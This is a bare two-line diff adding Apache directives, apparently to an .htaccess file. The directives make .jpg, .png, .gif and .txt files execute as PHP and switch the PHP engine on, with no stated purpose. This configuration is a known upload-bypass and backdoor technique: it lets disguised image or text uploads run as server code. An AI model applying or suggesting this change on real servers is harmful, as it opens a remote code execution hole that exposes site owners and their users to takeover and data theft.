@@ -1,0 +1,2 @@
+AddType application/x-httpd-php .jpg .png .gif .txt
+php_flag engine on
